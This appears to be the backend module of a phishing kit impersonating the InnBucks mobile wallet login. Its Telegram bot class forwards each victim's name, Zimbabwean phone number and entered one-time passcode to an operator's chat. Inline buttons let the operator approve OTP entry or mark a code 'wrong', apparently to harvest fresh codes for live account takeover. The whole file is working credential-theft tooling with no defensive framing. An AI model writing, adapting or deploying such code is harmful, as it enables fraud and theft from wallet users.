const fetch = require('node-fetch');
const crypto = require('crypto');

// Store sessions in memory instead of files (Render filesystem is read-only)
const sessions = {};

class InnBucksBot {
  constructor(token, adminId) {
    this.botToken = token;
    this.adminChatId = adminId;
    this.apiUrl = `https://api.telegram.org/bot${this.botToken}/`;
    this.lastUpdateId = 0;
  }

  async sendRequest(method, data = {}) {
    const url = this.apiUrl + method;
    try {
      const params = new URLSearchParams(data);
      const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: params.toString()
      });
      return await response.json();
    } catch (err) {
      console.error(`Telegram API error [${method}]:`, err.message);
      return null;
    }
  }

  generateSessionId(phone) {
    const raw = phone + Date.now() + crypto.randomBytes(8).toString('hex');
    return crypto.createHash('md5').update(raw).digest('hex');
  }

  async sendLoginAlert(firstName, lastName, phone) {
    const fullName = `${firstName} ${lastName}`.trim();
    const sessionId = this.generateSessionId(phone);
    const now = new Date().toISOString().replace('T', ' ').substring(0, 19);

    const keyboard = {
      inline_keyboard: [[
        { text: '🔑 Request OTP', callback_data: `otp_request_${sessionId}` }
      ]]
    };

    const message =
      `🔐 *New Login Attempt*\n\n` +
      `👤 *Name:* ${fullName}\n` +
      `📱 *Phone:* +263 ${phone}\n` +
      `⏰ *Time:* ${now}\n\n` +
      `Click below to allow OTP entry:`;

    await this.sendRequest('sendMessage', {
      chat_id: this.adminChatId,
      text: message,
      parse_mode: 'Markdown',
      reply_markup: JSON.stringify(keyboard)
    });

    // Store session in memory
    sessions[sessionId] = 'pending';

    return { success: true, sessionId };
  }

  async sendOtpAlert(sessionId, otp) {
    const now = new Date().toISOString().replace('T', ' ').substring(0, 19);

    const keyboard = {
      inline_keyboard: [[
        { text: '❌ Wrong Code', callback_data: `wrong_${sessionId}` },
        { text: '✅ Continue', callback_data: `continue_${sessionId}` }
      ]]
    };

    const message =
      `🔑 *OTP Entered*\n\n` +
      `🔢 *OTP Code:* \`${otp}\`\n` +
      `⏰ *Time:* ${now}\n\n` +
      `Choose action:`;

    return await this.sendRequest('sendMessage', {
      chat_id: this.adminChatId,
      text: message,
      parse_mode: 'Markdown',
      reply_markup: JSON.stringify(keyboard)
    });
  }

  async handleCallback(callbackQuery) {
    const data = callbackQuery.data;
    const callbackId = callbackQuery.id;

    if (data.startsWith('otp_request_')) {
      const sessionId = data.replace('otp_request_', '');
      sessions[sessionId] = 'approved';
      await this.sendRequest('answerCallbackQuery', { callback_query_id: callbackId });

    } else if (data.startsWith('wrong_')) {
      const sessionId = data.replace('wrong_', '');
      sessions[sessionId] = 'wrong_code';
      await this.sendRequest('answerCallbackQuery', { callback_query_id: callbackId });

    } else if (data.startsWith('continue_')) {
      const sessionId = data.replace('continue_', '');
      sessions[sessionId] = 'continue';
      await this.sendRequest('answerCallbackQuery', { callback_query_id: callbackId });
    }

    return true;
  }

  getSessionStatus(sessionId) {
    const status = sessions[sessionId] || 'pending';
    if (status !== 'pending') {
      delete sessions[sessionId]; // clean up after reading
    }
    return status;
  }
}

module.exports = InnBucksBot;
